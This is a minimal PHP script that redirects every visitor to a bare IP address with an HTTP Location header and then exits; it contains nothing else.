<?php
 header("Location: http://84.73.165.230");
 exit;
?>